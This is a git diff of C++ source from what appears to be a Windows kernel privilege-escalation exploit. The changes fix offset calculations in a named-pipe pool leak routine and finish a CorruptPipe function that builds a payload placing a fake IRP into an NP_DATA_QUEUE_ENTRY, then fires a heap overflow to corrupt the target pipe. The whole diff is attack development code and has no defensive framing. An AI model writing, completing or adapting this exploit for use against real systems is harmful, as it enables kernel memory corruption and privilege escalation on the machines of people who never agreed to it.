@@ -237,16 +237,18 @@ std::optional<MemoryBroker::LeakLayoutResult> MemoryBroker::GetPipeLayout()
                             UINT32 pipeIndex = 0;
                             memcpy(&pipeIndex, leakPtr + indexPos, sizeof(pipeIndex));
 
-                            UINT64 distance = pipeBase - iosbOffset;
+
+                            UINT64 iosbBase = iosbOffset - 0x4;
+                            UINT64 distance = pipeBase - iosbBase;
                             UINT64 desiredEnd = pipeBase + CHUNKSIZE + 0x20;
                             if (desiredEnd > leakSize) desiredEnd = leakSize;
-                            if (iosbOffset >= desiredEnd) continue;
+                            if (iosbBase >= desiredEnd) continue;
 
-                            UINT64 sliceLen = desiredEnd - iosbOffset;
+                            UINT64 sliceLen = desiredEnd - iosbBase;
 
                             LeakLayoutResult result;
                             result.leakedData.resize((size_t)sliceLen);
-                            memcpy(result.leakedData.data(), leakPtr + iosbOffset, (size_t)sliceLen);
+                            memcpy(result.leakedData.data(), leakPtr + iosbBase, (size_t)sliceLen);
                             result.targetPipeOffset = distance;
                             result.pipeIndex = pipeIndex;
 
@@ -318,32 +320,33 @@ bool MemoryBroker::CorruptPipe()
         DEBUG_PRINT(" [!] leakedData too small for payload copy\n");
         return false;
     }
+    size_t payloadSize = layout.leakedData.size() - CHUNKSIZE - (CHUNKSIZE - sizeof(LFH_NP_DATA_QUEUE_ENTRY));
 
+    std::vector<BYTE> payload(payloadSize);
 
-
-	HexDumpLittleEndian(layout.leakedData.data(), (size_t)layout.leakedData.size());
-
-    return true;
-
-
-
-
-    // Build payload; use vector to own memory
-    std::vector<BYTE> payload((size_t)CHUNKSIZE + 0x20);
-    std::fill(payload.begin(), payload.begin() + 0x10, (BYTE)'c');
-    memcpy(payload.data() + 0x10, layout.leakedData.data() + layout.targetPipeOffset, (size_t)CHUNKSIZE);
+	memcpy(payload.data(), layout.leakedData.data() + CHUNKSIZE - 0x10, (size_t)payloadSize);
+	//HexDumpLittleEndian(layout.leakedData.data(), (size_t)layout.leakedData.size());
 
     // Write NP_DATA_QUEUE_ENTRY fields into payload
-    NP_DATA_QUEUE_ENTRY* entry = reinterpret_cast<NP_DATA_QUEUE_ENTRY*>(payload.data() + 0x20);
-    entry->Irp = fakeIRP;
-    entry->EntryType = 0x1;
-    __debugbreak();
+    LFH_NP_DATA_QUEUE_ENTRY* entry = reinterpret_cast<LFH_NP_DATA_QUEUE_ENTRY*>(payload.data() + (layout.targetPipeOffset - CHUNKSIZE + 0x10));
+    entry->dataQueue.Irp = fakeIRP;
+    entry->dataQueue.EntryType = 0x1;
+
+	HexDumpLittleEndian(layout.leakedData.data(), (size_t)layout.leakedData.size());
+	printf(" [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x%llx within leaked chunk\n", (unsigned long long)(layout.targetPipeOffset - CHUNKSIZE + 0x10));
+	HexDumpLittleEndian(entry, sizeof(NP_DATA_QUEUE_ENTRY));
+	printf(" [*] Full payload to trigger overflow:\n");
+    HexDumpLittleEndian(payload.data(), (size_t)payload.size());
+
     DEBUG_PRINT(" [*] Triggering Overflow to Corrupt NP_DATA_QUEUE_ENTRY of Target Pipe\n");
     UINT64 clientManager = 0;
-    memcpy(&clientManager, layout.leakedData.data() + layout.targetPipeOffset + 0x10, sizeof(UINT64));
+    memcpy(&clientManager, entry->dataQueue.NextEntry.Flink, sizeof(UINT64));
 
     // Trigger overflow with payload
+
+
     InvokeTriggerOverflow(payload.data(), (UINT64)payload.size());
+	printf(" [*] Overflow triggered, waiting for corruption to take effect...\n");
 
     auto pipeManagerLocked = pipeManager.lock();
     if (!pipeManagerLocked) {
@@ -356,7 +359,9 @@ bool MemoryBroker::CorruptPipe()
         DEBUG_PRINT(" [!] Failed to verify corruption\n");
         return false;
     }
+	DEBUG_PRINT(" [*] Successfully corrupted target pipe's NP_DATA_QUEUE_ENTRY\n");
 
+    Sleep(10000000);
     return true;
 }
 
